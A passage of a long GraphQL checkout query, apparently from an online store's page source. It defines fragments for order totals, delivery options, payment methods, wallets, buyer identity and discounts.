totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{... on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{... on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{... on PurchaseOrderMerchandiseLine{stableId quantity{... on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}... on PurchaseOrderBundleLineComponent{stableId quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}... on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{... on PurchaseOrderMerchandiseLine{stableId quantity{... on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}... on PurchaseOrderBundleLineComponent{stableId quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}... on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{... on PurchaseOrderPaymentTerms{billingAddress{__typename... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{... on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}... on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}... on WalletPaymentMethod{name walletContent{... on ShopPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}... on PaypalWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}... on ApplePayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}data signature version __typename}... on GooglePayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}... on FacebookPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}... on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}... on WalletsPlatformPaymentMethod{name walletParams __typename}... on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}additionalParameters{... on IdealPaymentMethodParameters{bank __typename}__typename}__typename}... on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on PaypalBillingAgreementPaymentMethod{token billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}... on RedeemablePaymentMethod{redemptionSource redemptionContent{... on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}... on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}... on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}... on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{... on PurchaseOrderBuyerIdentityTerms{contactMethod{... on PurchaseOrderEmailContactMethod{email __typename}... on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{... on PurchaseOrderEmailContactMethod{email __typename}... on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename... on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}... on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}... on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename... on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{... on MerchandisePropertyValueString{string:value __typename}... on MerchandisePropertyValueInt{int:value __typename}... on MerchandisePropertyValueFloat{float:value __typename}... on MerchandisePropertyValueBoolean{boolean:value __typename}... on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{... on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}... on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}... on DiscountCodeTrigger{code __typename}... on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{... on FilledBuyerIdentityTerms{email phone customer{... on CustomerProfile{email __typename}... on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{... on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{... on RetailAttributions{deviceId locationId userId __typename}... on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{... on SaleAttribution{recipient{... on StaffMember{id __typename}... on Location{id __typename}... on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment... on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename... on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{... on DiscountAllocatedAllocationSet{__typename allocations{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename... on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{... on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}... on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{... on CompleteDeliveryStrategy{handle __typename}... on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{... on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{... on IntIntervalConstraint{lowerBound upperBound __typename}... on IntValueConstraint{value __typename}__typename}amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{... on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{... on MerchandiseLine{stableId quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on MerchandiseBundleLineComponent{stableId quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on MerchandiseLineComponentWithCapabilities{stableId quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{... on SourceProvidedMerchandise{__typename requiresShipping}... on ProductVariantMerchandise{__typename requiresShipping}... on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}... on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{... on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{... on LineComponentDiscountAllocation{allocation{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{... on PendingTerms{taskId pollDelay __typename}... on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{... on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{... on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}... on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{... on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{... on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{... on IntIntervalConstraint{lowerBound upperBound __typename}... on IntValueConstraint{value __typename}__typename}amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{... on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}__typename}payment{... on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{... on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}... on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}... on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}... on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename... on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}... on WalletsPlatformConfiguration{name configurationParams __typename}... on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}... on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}... on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}... on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}... on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}... on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}... on AmazonPayClassicWalletConfig{__typename name orderingIndex}... on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{... on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}... on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}... on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}... on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name 